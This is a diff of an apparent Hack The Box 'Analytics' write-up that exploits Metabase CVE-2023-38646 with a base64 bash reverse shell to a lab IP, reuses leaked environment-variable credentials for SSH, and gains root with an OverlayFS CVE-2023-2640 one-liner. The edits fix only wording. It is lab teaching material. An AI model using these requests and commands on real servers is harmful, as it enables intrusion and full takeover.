@@ -13,7 +13,7 @@ layout: list
 ![](/assets/images/HTB/Analytics/Analitics-LOGO.png)
 
 
-This machine focuses on exploiting a vulnerable instance of *Metabase* to gain initial access. with the help of the exploit - CVE-2023-38646, we obtain command execution on the target. The next phase involves navigating a Docker container environment, leveraging exposed credentials, and transitioning to an SSH session with user-level access. Finally, the privilege escalation is achieved by exploiting a known vulnerability (CVE-2023-2640) in the operating system to gain root access.
+This machine focuses on exploiting a vulnerable instance of *Metabase* to gain initial access. With the help of the exploit - CVE-2023-38646, we obtain command execution on the target. The next phase involves navigating a Docker container environment, leveraging exposed credentials, and transitioning to an SSH session with user-level access. Finally, the privilege escalation is achieved by exploiting a known vulnerability (CVE-2023-2640) in the operating system to gain root access.
 
 {{< callout type="info" >}}
   Tags:
@@ -32,18 +32,18 @@ This machine focuses on exploiting a vulnerable instance of *Metabase* to gain i
 {{% /details %}}
 {{< /callout >}}
 
-## Enumeration. 
-- ***IP:*** 10.10.11.233
-- ***Enviroment:*** Linux
-### Port Scan.
+## Enumeration
+- * **IP:** 10.10.11.233
+- * **Environment:** Linux
+### Port Scan
 
-We sstart by using *Nmap*, performing a scan of all ports to discover *services running* on the target machine.
+We start by using *Nmap*, performing a scan of all ports to discover *services running* on the target machine.
 
 ```bash
 sudo nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.233
 ```
 
-```python
+```bash
 # Nmap 7.94SVN scan initiated Tue Mar 12 21:07:41 2024 as: nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.233
 Nmap scan report for 10.10.11.233
 Host is up, received echo-reply ttl 63 (0.073s latency).
@@ -64,24 +64,24 @@ PORT   STATE SERVICE REASON         VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-The scan reveal *2 open ports* (22 & 80) and we can see its redirecting to the domain *analytical.htb*. Adding analytical.htb to /etc/hosts allowed us to access the web service; after investigating the web page we can find a subdomain, data.analytical.htb, hosting a **Metabase** login page.
+The scan reveals *2 open ports* (22 & 80) and we can see it's redirecting to the domain *analytical.htb*. Adding `analytical.htb` to `/etc/hosts` allowed us to access the web service; after investigating the web page, we can find a subdomain, `data.analytical.htb`, hosting a **Metabase** login page.
 
 ![Alt Text](/assets/images/HTB/Analytics/Analitics1.png)
 
-## FootHold.
+## FootHold
 
-### Finding the exploit.
-I looked only for "metabase Vulnerabilities" and I am able to find an unauthenticated RCE vulnerability (**CVE-2023-38646**). CVE-2023-38646 is a critical vulnerability in Metabase, an open-source business intelligence tool, allowing pre-authentication remote code execution (RCE). This means an attacker can execute arbitrary commands on a Metabase server **without needing valid login credentials**. Exploiting this required extracting the setup token from the API endpoint */api/session/properties* (for more information on this exploit, check this [blog](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646)).
+### Finding the exploit
+I looked only for "Metabase Vulnerabilities" and I am able to find an unauthenticated RCE vulnerability (**CVE-2023-38646**). CVE-2023-38646 is a critical vulnerability in Metabase, an open-source business intelligence tool, allowing pre-authentication remote code execution (RCE). This means an attacker can execute arbitrary commands on a Metabase server **without needing valid login credentials**. Exploiting this required extracting the setup token from the API endpoint */api/session/properties* (for more information on this exploit, check this [blog](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646)).
 
-### Exploit setup.
+### Exploit setup
 
-If we go to http://data.analytical.htb/api/session/properties we will be able to see some "restictied/privileged" information the API is providing us due to **insufficient validation and accass control** on metabase.
+If we go to http://data.analytical.htb/api/session/properties we will be able to see some "restricted/privileged" information the API is providing us due to **insufficient validation and access control** on Metabase.
 
 ![Alt Text](/assets/images/HTB/Analytics/Analitics2.png)
 
-- **setup-token** :249fa03d-fd94-4d5b-b94f-b4ebf3df681f
+- **setup-token**: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
 
-By creating a payload encoded in Base64, we could inject a reverse shell via Metabase's database setup. Here is an example of the *post* request that needs to be made to trigger the vulnerability:
+By creating a payload encoded in Base64, we could inject a reverse shell via Metabase's database setup. Here is an example of the POST request that needs to be made to trigger the vulnerability:
 
 ```json
 POST /api/setup/validate HTTP/1.1
@@ -122,8 +122,8 @@ bash -i >& /dev/tcp/10.10.14.13/443 0>&1
 ```
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDMgIDA+JjEK
 ```
-### Exploit execution.
-Using Burp Suite's Repeater, we sent a POST request to */api/setup/validate* with the  payload embedded in the request body.
+### Exploit execution
+Using Burp Suite's Repeater, we sent a POST request to `/api/setup/validate` with the payload embedded in the request body.
 
 ```json
 POST /api/setup/validate HTTP/1.1
@@ -164,9 +164,9 @@ Before sending the Burp request (payload), we set up a listener on port 443 to c
 
 ![Alt Text](/assets/images/HTB/Analytics/Analitics5.png)
 
-## Privilege escalation - Root.
+## Privilege escalation - Root
 
-Something that i usually do when i get to a new system is to check the *enviroment variables* some times we can find useful information in there.
+Something that I usually do when I get to a new system is to check the environment variables; sometimes we can find useful information there.
 
 ```bash
 env
@@ -174,44 +174,43 @@ env
 
 ![Alt Text](/assets/images/HTB/Analytics/Analitics6.png)
 
-Inspecting the environment variables revealed application(metabase) credentials:
-•	User: metalytics
-•	Password: An4lytics_ds20223#
+Inspecting the environment variables revealed application (Metabase) credentials:
+* User: `metalytics`
+* Password: `An4lytics_ds20223#`
 
 Using these credentials, we accessed the system via SSH to gain a more stable foothold:
-bash
 ```bash
 ssh metalytics@10.10.11.233
 ```
 
 ### Kernel Exploit for Privilege Escalation
 #### Finding kernel version
-The target machine was running **Ubuntu 22.04.2**. A quick search revealed a privilege escalation vulnerability (CVE-2023-2640) in the kernel. This can be found either by using similar tools to linpeas.sh or using linux commands:
+The target machine was running **Ubuntu 22.04.2**. A quick search revealed a privilege escalation vulnerability (CVE-2023-2640) in the kernel. This can be found by using tools like `linpeas.sh` or standard Linux commands:
 
 ```bash
 uname -a
 ```
 ![Alt Text](/assets/images/HTB/Analytics/Analitics7.png)
 
-After trying out multiple exploits I was able to find a [working exploit.](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)
+After trying several exploits, I found a [working one](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629).
 
 #### Running exploit
-The exploit involved leveraging unshare to execute a privileged shell. 
+The exploit involved leveraging `unshare` to execute a privileged shell. 
 ```bash
 unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
 ```
 
 ![Alt Text](/assets/images/HTB/Analytics/Analytics8.png)
 
-After running the executable created, we gained root access to the system:
+After running the exploit, we gain root access to the system:
 ```bash
 whoami
 ```
 ![Alt Text](/assets/images/HTB/Analytics/Analytics9.png)
 
-## Takeaways:
--	Always start with thorough enumeration, as it uncovers critical entry points like subdomains or API endpoints.
--	CVE research and public write-ups are invaluable for learning manual exploitation techniques.
--	Kernel privilege escalation remains a go-to technique when user-level access is obtained.
+## Takeaways
+- Always start with thorough enumeration, as it uncovers critical entry points like subdomains or API endpoints.
+- CVE research and public write-ups are invaluable for learning manual exploitation techniques.
+- Kernel privilege escalation remains a go-to technique when user-level access is obtained.
 - By following this step-by-step guide, we successfully exploited and rooted the machine. It’s a great example of chaining vulnerabilities for a complete compromise!
 
